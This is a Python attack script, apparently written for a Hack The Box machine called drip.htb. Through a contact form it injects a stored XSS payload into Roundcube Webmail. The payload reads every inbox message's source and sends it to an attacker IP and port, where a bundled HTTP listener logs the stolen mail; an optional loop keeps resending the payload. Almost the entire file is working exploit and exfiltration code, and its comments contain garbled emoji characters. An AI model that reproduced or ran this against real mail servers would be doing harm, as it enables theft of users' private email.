import requests
import urllib.parse
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import argparse
import time
 
# ğŸ¯ **Attacker Configuration**
ATTACKER_IP = "10.10.14.209"
ATTACKER_PORT = 8001
RECIPIENT_EMAIL = "bcase@drip.htb"  # âœ… Configurable recipient
LOG_FILE = "emails.log"  # âœ… Log file for captured email data
PROXY = "http://127.0.0.1:8080"  # âœ… Proxy for debugging (Burp Suite / Caido)
 
# ğŸ¯ **Target Configuration**
TARGET_URL = "http://drip.htb/contact"
 
# ğŸ”§ **Command-line Argument Parser**
parser = argparse.ArgumentParser(description="Automate XSS Injection for Roundcube Webmail")
parser.add_argument("-d", "--debug", action="store_true", help="Enable debugging mode (send to proxy)")
parser.add_argument("-i", "--interval", type=int, default=30, help="Interval in seconds to send payload (default: 30)")
parser.add_argument("-c", "--continuous", action="store_true", help="Send payload continuously at intervals")
args = parser.parse_args()
 
# âœ… **Fix: Ensure Single Encoding**
raw_payload = f'''<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=list&_mbox=INBOX&_page=&_remote=1').then(r=>r.text()).then(t=>{{[...t.matchAll(/this\\.add_message_row\\((\\d+),/g)].forEach(m=>{{fetch(`/?_task=mail&_uid=${{m[1]}}&_mbox=INBOX&_action=viewsource`).then(r=>r.text()).then(data=>{{fetch(`http://{ATTACKER_IP}:{ATTACKER_PORT}/?data=${{encodeURIComponent(data)}}`);}});}});}}); foo=bar">
  Foo
</body>'''
 
# ğŸš€ **Fix: Correct Encoding Method**
# - `urllib.parse.quote` is **only used once**
# - `safe="'"` ensures proper encoding **without breaking JavaScript**
encoded_payload = urllib.parse.quote(raw_payload, safe="'()")
undouble = urllib.parse.unquote(encoded_payload)
 
# ğŸ“¨ **Prepare POST Data**
post_data = {
    "name": "test",
    "email": "test@test.com",
    "message": undouble,  # âœ… Single-encoded payload
    "content": "html",
    "recipient": RECIPIENT_EMAIL,
}
 
# ğŸ›  **Prepare Headers**
headers = {
    "Host": "drip.htb",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://drip.htb",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://drip.htb/index",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
}
 
# ğŸš€ **Function to Send the Malicious XSS Payload**
def send_post():
    if args.debug:
        print("\n[ğŸ›  DEBUG MODE ENABLED]")
        print("[ğŸ“œ RAW PAYLOAD]\n", raw_payload)
        print("\n[ğŸ”¢ ENCODED PAYLOAD]\n", encoded_payload)
        proxies = {"http": PROXY, "https": PROXY}
    else:
        proxies = None
 
    try:
        response = requests.post(TARGET_URL, data=post_data, headers=headers, proxies=proxies)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] POST Request Sent! Status Code: {response.status_code}")
    except Exception as e:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] Error sending POST: {e}")

# ğŸ”„ **Function to Send Payload Continuously**
def continuous_send():
    print(f"[+] Starting continuous mode - sending payload every {args.interval} seconds")
    attempt = 1
    while True:
        print(f"\n[+] Attempt #{attempt}")
        send_post()
        attempt += 1
        time.sleep(args.interval)
 
# ğŸ“¥ **Custom HTTP Server to Capture & Log Exfiltrated Email Data**
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "/?data=" in self.path:
            encoded_data = self.path.split("/?data=")[1]
            decoded_data = urllib.parse.unquote(encoded_data)
 
            print("\n[+] ğŸ“© Captured Email Data:")
            print(decoded_data)
            print("-" * 50)
 
            # âœï¸ **Log Data to a File**
            with open(LOG_FILE, "a", encoding="utf-8") as log_file:
                log_file.write(f"\n[+] Captured Email Data:\n{decoded_data}\n" + "-" * 50 + "\n")
                print(f"[+] ğŸ”¥ Email data saved to {LOG_FILE}")
 
        else:
            print("[!] Received request but no data found.")
 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
 
    def log_message(self, format, *args):
        return  # ğŸ”‡ Suppress default HTTP logging
 
# ğŸ¯ **Function to Start the HTTP Server**
def start_server():
    server_address = ("0.0.0.0", ATTACKER_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on {ATTACKER_IP}:{ATTACKER_PORT} for exfiltrated data...")
    httpd.serve_forever()
 
# ğŸ”„ **Run HTTP Server in a Separate Thread**
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()
 
# ğŸ”¥ **Send the XSS Payload**
if args.continuous:
    # Run continuous sending in a separate thread
    send_thread = threading.Thread(target=continuous_send)
    send_thread.daemon = True
    send_thread.start()
else:
    send_post()
 
# ğŸ”„ **Keep the Script Running to Capture Exfiltrated Emails**
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
